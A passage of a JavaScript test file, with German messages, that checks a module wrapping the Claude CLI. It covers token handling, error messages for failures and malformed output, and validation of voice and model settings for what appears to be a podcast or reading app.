    assert.equal(seen.opts.env.CLAUDE_CODE_OAUTH_TOKEN, 'oat-abo');
    assert.equal(seen.opts.env.ANTHROPIC_API_KEY, undefined, 'API-Key geht nicht mit, sonst rechnet die CLI darüber ab');
  } finally {
    delete process.env.ANTHROPIC_API_KEY;
  }
});

test('Claude-Writer: Fehler als Meldung', async () => {
  await assert.rejects(createClaudeWriter({ token: null }).write({ system: '', prompt: '', input: '', schema: {} }), /CLAUDE_CODE_OAUTH_TOKEN fehlt/);
  const cases = [
    [fakeClaude({ is_error: true, subtype: 'error_during_execution', result: 'Usage limit reached' }, { code: 1 }), /Claude: Usage limit reached/],
    [fakeClaude({ is_error: false, result: 'Nein.' }), /kein Ergebnis im verlangten Format/],
    [fakeClaude('kaputt'), /ohne JSON/],
  ];
  for (const [{ run }, msg] of cases) {
    await assert.rejects(createClaudeWriter({ token: 't', run, logger: quiet }).write({ system: '', prompt: '', input: '', schema: {} }), (e) => e instanceof WriterError && msg.test(e.message));
  }
  const missing = () => {
    const child = new EventEmitter();
    child.stdout = new PassThrough();
    child.stderr = new PassThrough();
    child.stdin = new PassThrough();
    setImmediate(() => child.emit('error', Object.assign(new Error('spawn claude ENOENT'), { code: 'ENOENT' })));
    return child;
  };
  await assert.rejects(createClaudeWriter({ token: 't', run: missing, logger: quiet }).write({ system: '', prompt: '', input: '', schema: {} }), /nicht installiert/);
});

test('Einstellungen: Folgen-Stimmen, Moderation folgt der Vorlese-Stimme, Claude-Modell sonnet', async () => {
  const { createSettingsStore, validateSettings } = await import('../src/cockpit/settings.js');
  const s = createSettingsStore({ logger: quiet });
  assert.deepEqual(s.get().episodes, { host: 'JBFqnCBsd6RMkjVDRZzb', guest: 'EXAVITQu4vr4xnSDxMaL', model: 'sonnet' });
  s.save({ tts: { voice: 'Erz1' }, calendars: [] });
  assert.equal(s.get().episodes.host, 'Erz1');
  s.save({ tts: { voice: 'Erz1' }, episodes: { host: 'Mod2', guest: 'Gast3', model: 'opus' }, calendars: [] });
  assert.deepEqual(s.get().episodes, { host: 'Mod2', guest: 'Gast3', model: 'opus' });
  assert.throws(() => validateSettings({ episodes: { guest: 'zwei Wörter' } }), /Gast/);
  assert.throws(() => validateSettings({ episodes: { model: 'claude opus' } }), /Claude-Modell/);
});
